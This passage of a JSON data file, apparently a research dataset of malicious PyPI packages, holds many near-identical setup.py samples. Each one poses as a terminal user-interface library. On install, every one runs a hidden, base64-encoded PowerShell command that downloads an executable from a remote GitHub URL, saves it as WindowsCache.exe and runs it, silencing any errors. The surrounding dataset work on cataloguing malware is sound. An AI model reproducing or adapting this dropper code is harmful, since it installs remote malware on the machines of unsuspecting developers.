        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpingpingcontrol',\n    packages = ['modlib'],\n    version = '9.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqrandompullmine-v6.45",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrandompullmine',\n    packages = ['modlib'],\n    version = '10.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqsplitmaskpy-v9.35",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqsplitmaskpy',\n    packages = ['modlib'],\n    version = '2.51',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-libcckillhydra-v8.76",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcckillhydra',\n    packages = ['modlib'],\n    version = '2.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-libcontrolhttpstr-v7.75",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcontrolhttpstr',\n    packages = ['modlib'],\n    version = '4.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqosinthackedstudy-v4.60",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqosinthackedstudy',\n    packages = ['modlib'],\n    version = '10.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqrecpuvm-v5.27",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrecpuvm',\n    packages = ['modlib'],\n    version = '5.38',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqtoolvisaram-v5.90",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqtoolvisaram',\n    packages = ['modlib'],\n    version = '3.63',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqvisastred-v10.10",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqvisastred',\n    packages = ['modlib'],\n    version = '10.77',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libccreplacemask-v8.41",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libccreplacemask',\n    packages = ['modlib'],\n    version = '3.8',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libguicraftcandy-v10.87",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libguicraftcandy',\n    packages = ['modlib'],\n    version = '1.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libkilledgame-v4.61",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libkilledgame',\n    packages = ['modlib'],\n    version = '4.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpiposintmc-v4.71",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpiposintmc',\n    packages = ['modlib'],\n    version = '1.23',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-librandomintelgame-v7.10",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librandomintelgame',\n    packages = ['modlib'],\n    version = '10.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-libminerandomosint-v2.54",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libminerandomosint',\n    packages = ['modlib'],\n    version = '1.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-libpullpongpaypal-v1.86",
